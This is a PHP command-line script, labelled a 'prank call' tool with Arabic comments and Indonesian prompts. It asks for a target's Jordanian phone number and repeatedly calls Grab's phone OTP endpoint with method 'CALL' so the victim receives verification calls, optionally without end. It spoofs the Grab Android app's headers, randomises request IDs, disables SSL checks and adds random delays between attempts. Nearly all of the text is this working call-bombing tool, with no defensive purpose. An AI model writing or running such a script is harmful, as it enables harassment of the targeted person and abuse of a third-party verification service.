<?php
function get_input() {
    return trim(fgets(STDIN));
}

class PrankCall {
    private $number;
    private $headers = [];
    private $valid_prefixes = ['079', '078', '077', '075']; // الخطوط المدعومة في الأردن

    public function __construct($no) {
        $this->number = $this->validate_number($no);
    }

    private function validate_number($no) {
        // إزالة أي أحرف غير رقمية
        $no = preg_replace('/[^0-9+]/', '', $no);

        // التحقق من الصيغة المحلية (بدون +962)
        if (substr($no, 0, 1) !== '+') {
            // التحقق من أن الرقم يبدأ بخط صالح
            $prefix = substr($no, 0, 3);
            if (!in_array($prefix, $this->valid_prefixes)) {
                die("Error: Invalid Jordanian phone number. Supported prefixes are: " . implode(', ', $this->valid_prefixes) . ".\n");
            }
            // تحويل الرقم إلى الصيغة الدولية (+962)
            $no = '+962' . substr($no, 1);
        } else {
            // التحقق من أن الرقم يبدأ بـ +962
            if (substr($no, 0, 4) !== '+962') {
                die("Error: Invalid country code. Please use +962 for Jordan.\n");
            }
        }

        // التحقق من طول الرقم
        if (strlen($no) < 12 || strlen($no) > 13) { // +96279XXXXXXX
            die("Error: Invalid phone number length.\n");
        }

        return $no;
    }

    private function generate_headers() {
        return [
            "x-request-id: " . $this->generate_uuid(),
            "User-Agent: Grab/6.39.0 (Android 13; Build " . $this->random_str(7) . ")",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept-Language: id-ID;q=1.0, en-us;q=0.9, en;q=0.8"
        ];
    }

    private function generate_uuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function random_str($length) {
        return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyz', 5)), 0, $length);
    }

    public function send_otp() {
        $ch = curl_init();

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://api.grab.com/grabid/v2/phone/otp',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'method' => 'CALL',
                'countryCode' => 'JO', // رمز الدولة للأردن
                'phoneNumber' => substr($this->number, 1), // الرقم بدون +
                'templateID' => 'pax_android_production'
            ]),
            CURLOPT_HTTPHEADER => $this->generate_headers(),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10
        ]);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // التحقق من النجاح بناءً على الرد
        return ($http_code == 200 && strpos($response, 'challengeID') !== false);
    }

    public function run() {
        echo "Jumlah percobaan (0 untuk terus menerus): ";
        $count = (int)get_input();

        $attempt = 0;
        while ($count == 0 || $attempt < $count) {
            $success = $this->send_otp();
            $attempt++;

            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses (Panggilan berhasil dikirim!)' : 'Gagal (Tidak ada panggilان)') . PHP_EOL;

            if ($count != 0 && $attempt >= $count) break;
            sleep(rand(1, 3)); // تأخير بين المحاولات
        }

        echo "Proses selesai!" . PHP_EOL;
    }
}

echo "########## PRANK CALL GRAB ##########\n";
echo "Nomor Target (contoh: +962791234567 atau 0791234567): ";
$number = get_input();

$prank = new PrankCall($number);
$prank->run();
?>
